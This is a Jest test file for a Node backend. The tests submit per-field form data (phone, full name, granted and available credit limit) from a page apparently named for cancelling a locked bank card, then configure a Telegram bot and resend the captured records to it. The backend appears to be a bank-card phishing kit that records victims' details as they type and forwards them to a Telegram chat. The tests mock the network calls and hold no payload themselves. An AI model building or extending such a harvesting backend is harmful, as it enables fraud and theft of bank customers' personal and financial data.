const request = require('supertest');
const path = require('path');

function loadApp() {
  const p = path.join(__dirname, '..', 'server.js');
  delete require.cache[require.resolve(p)];
  return require(p);
}

describe('Backend flow: field-update and telegram resend', () => {
  let app;

  beforeAll(() => {
    // mock global.fetch to simulate Telegram API responses
    global.fetch = jest.fn(async (url) => {
      if (String(url).includes('/getMe')) {
        return { ok: true, json: async () => ({ ok: true, result: { username: 'bot' } }) };
      }
      return { ok: true, json: async () => ({ ok: true, result: { message_id: 1 } }) };
    });
  });

  afterAll(() => {
    try {
      delete global.fetch;
    } catch (e) {
      // Intentionally ignoring the error
    }
  });

  beforeEach(() => {
    const mod = loadApp();
    app = mod.app || mod;
  });

  test('per-field /api/field-update records and returns ok', async () => {
    const res = await request(app)
      .post('/api/field-update')
      .send({
        sessionId: 'sess-1',
        field: 'phone',
        value: '+84900112233',
        page: 'huy-tam-khoa-the.html',
      })
      .set('Accept', 'application/json');
    expect(res.status).toBe(200);
    expect(res.body && res.body.status).toBe('ok');
  });

  test('consolidated /api/field-update saves and returns saved paths', async () => {
    const payload = {
      sessionId: 'sess-2',
      fullName: 'Tran B',
      limitGranted: '100000000',
      limitAvailable: '50000000',
      phone: '+84900999888',
      page: 'huy-tam-khoa-the.html',
    };
    const res = await request(app)
      .post('/api/field-update')
      .send(payload)
      .set('Accept', 'application/json');
    expect(res.status).toBe(200);
    expect(res.body && res.body.status).toBe('ok');
    // saved may include saved paths object
    expect(res.body.saved === undefined || typeof res.body.saved === 'object').toBeTruthy();
  });

  test('telegram resend returns ok (when telegram not configured returns 400)', async () => {
    // Without configuring telegram, endpoint should respond 400
    const r1 = await request(app).post('/api/telegram/resend').send({ lastN: 5 });
    expect([200, 400]).toContain(r1.status);

    // Configure telegram via /api/telegram/config (set a fake valid token format)
    const cfg = await request(app)
      .post('/api/telegram/config')
      .send({ token: '123:ABC', chatId: '12345' });
    expect(cfg.status).toBe(200);

    const r2 = await request(app).post('/api/telegram/resend').send({ lastN: 5 });
    // With mocked fetch the resend loop should return 200 and a results structure
    expect(r2.status).toBe(200);
    expect(r2.body && (r2.body.status === 'ok' || r2.body.count !== undefined)).toBeTruthy();
  });
});
